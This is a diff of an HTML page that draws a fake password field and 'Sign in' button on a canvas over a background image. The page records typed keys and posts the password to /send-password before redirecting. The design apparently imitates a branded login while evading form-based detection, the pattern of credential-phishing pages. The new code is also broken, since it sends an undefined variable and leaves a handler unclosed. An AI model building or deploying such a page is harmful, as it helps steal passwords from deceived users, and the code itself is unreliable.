@@ -1,127 +1,137 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Thank You</title>
+  <meta charset="UTF-8" />
+  <title>Canvas Login</title>
   <style>
     body { margin: 0; overflow: hidden; }
     canvas { display: block; }
   </style>
 </head>
 <body>
-  <canvas id="canvas" width="800" height="600"></canvas>
+<canvas id="canvas" width="1359" height="633"></canvas>
+<script>
+// Get canvas & context
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
-  <script>
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const bg = new Image();
-    bg.src = 'thank-you-background.jpg'; // make sure this file is in /public folder
+// Load your background image
+const bgImage = new Image();
+bgImage.src = 'background1.png'; // Match your file name
 
-    const inputBox = {
-      x: 230,
-      y: 275,
-      width: 340,
-      height: 45,
-      value: '',
-      focused: false
-    };
+// Updated, confirmed positions:
+const inputBox = { x: 505, y: 231, width: 345, height: 40 };
+const button = { x: 748, y: 325, width: 109, height: 35 };
 
-    const button = {
-      x: 315,
-      y: 340,
-      width: 165,
-      height: 50,
-      text: 'Submit'
-    };
+let inputText = '';
+let isTyping = false;
+let inputClickedOnce = false;
 
-    bg.onload = () => {
-      draw();
-    };
+let cursorVisible = true;
+let lastBlink = 0;
 
-    function draw() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);
+// Start loop when image loads
+bgImage.onload = () => requestAnimationFrame(loop);
 
-      // Input box
-      ctx.fillStyle = inputBox.focused ? '#ffffffcc' : '#ffffff88';
-      ctx.fillRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
-      ctx.strokeStyle = '#333';
-      ctx.strokeRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
+function loop(timestamp) {
+  if (timestamp - lastBlink > 500) {
+    cursorVisible = !cursorVisible;
+    lastBlink = timestamp;
+  }
+  draw();
+  requestAnimationFrame(loop);
+}
 
-      ctx.fillStyle = '#000';
-      ctx.font = '20px Arial';
-      ctx.fillText(inputBox.value || 'Enter password...', inputBox.x + 10, inputBox.y + 30);
+function draw() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
 
-      // Button
-      ctx.fillStyle = '#007BFF';
-      ctx.fillRect(button.x, button.y, button.width, button.height);
-      ctx.fillStyle = '#fff';
-      ctx.font = 'bold 18px Arial';
-      ctx.fillText(button.text, button.x + 45, button.y + 30);
+  // ✅ Input box background only, no border
+  ctx.fillStyle = inputClickedOnce ? '#fff' : '#f5f5f5';
+  ctx.fillRect(inputBox.x, inputBox.y, inputBox.width, inputBox.height);
+
+  // ✅ Text inside box
+  ctx.fillStyle = '#000';
+  ctx.font = '16px Arial';
+  ctx.textBaseline = 'middle';
+  ctx.textAlign = 'start';
+  const displayText = inputText || 'Password';
+  const textX = inputBox.x + 10;
+  const textY = inputBox.y + inputBox.height / 2;
+  ctx.fillText(displayText, textX, textY);
+
+  // ✅ Blinking cursor
+  if (isTyping && cursorVisible) {
+    const textWidth = ctx.measureText(inputText).width;
+    const cursorX = textX + textWidth + 2;
+    const cursorY = inputBox.y + 8;
+    const cursorHeight = inputBox.height - 16;
+
+    ctx.beginPath();
+    ctx.moveTo(cursorX, cursorY);
+    ctx.lineTo(cursorX, cursorY + cursorHeight);
+    ctx.strokeStyle = '#000';
+    ctx.lineWidth = 1;
+    ctx.stroke();
+  }
+
+  // ✅ Sign In button
+  ctx.fillStyle = '#0078d4';
+  ctx.fillRect(button.x, button.y, button.width, button.height);
+  ctx.fillStyle = '#fff';
+  ctx.font = '18px Arial';
+  ctx.textAlign = 'center';
+  ctx.fillText('Sign in', button.x + button.width / 2, button.y + button.height / 2 + 5);
+}
+
+// ✅ Click handler
+canvas.addEventListener('click', (e) => {
+  const rect = canvas.getBoundingClientRect();
+  const x = e.clientX - rect.left;
+  const y = e.clientY - rect.top;
+
+  if (x >= inputBox.x && x <= inputBox.x + inputBox.width &&
+      y >= inputBox.y && y <= inputBox.y + inputBox.height) {
+    isTyping = true;
+    inputClickedOnce = true;
+  } else {
+    isTyping = false;
+  }
+
+  if (x >= button.x && x <= button.x + button.width &&
+      y >= button.y && y <= button.y + button.height) {
+    if (!inputText) {
+      alert('Please enter your password!');
+      return;
     }
 
-    canvas.addEventListener('click', (e) => {
-      const rect = canvas.getBoundingClientRect();
-      const mouseX = e.clientX - rect.left;
-      const mouseY = e.clientY - rect.top;
+    // Send POST request and redirect
+    fetch('/send-password', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ password: userTypedPassword })
+})
+.then(res => res.json())
+.then(data => {
+  if (data.success && data.redirect) {
+    window.location.href = data.redirect;
+  } else {
+    alert('Error: ' + data.message);
+  }
+});
 
-      if (
-        mouseX > inputBox.x && mouseX < inputBox.x + inputBox.width &&
-        mouseY > inputBox.y && mouseY < inputBox.y + inputBox.height
-      ) {
-        inputBox.focused = true;
-      } else {
-        inputBox.focused = false;
-      }
-
-      // Button click
-      if (
-        mouseX > button.x && mouseX < button.x + button.width &&
-        mouseY > button.y && mouseY < button.y + button.height
-      ) {
-        sendPassword(inputBox.value);
-      }
-
-      draw();
-    });
-
-    window.addEventListener('keydown', (e) => {
-      if (!inputBox.focused) return;
-
-      if (e.key === 'Backspace') {
-        inputBox.value = inputBox.value.slice(0, -1);
-      } else if (e.key === 'Enter') {
-        sendPassword(inputBox.value);
-      } else if (e.key.length === 1 && inputBox.value.length < 30) {
-        inputBox.value += e.key;
-      }
-      draw();
-    });
-
-    function sendPassword(password) {
-      if (!password) {
-        alert('Please enter a password.');
-        return;
-      }
-
-      fetch('/send-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.success && data.redirect) {
-          window.location.href = data.redirect;
-        } else {
-          alert('Failed to submit password.');
-        }
-      })
-      .catch(err => {
-        console.error(err);
-        alert('Error submitting password.');
-      });
+// ✅ Typing input
+document.addEventListener('keydown', (e) => {
+  if (isTyping) {
+    if (e.key === 'Backspace') {
+      inputText = inputText.slice(0, -1);
+    } else if (e.key.length === 1) {
+      inputText += e.key;
+    } else if (e.key === 'Enter') {
+      isTyping = false;
     }
-  </script>
+  }
+});
+</script>
 </body>
 </html>
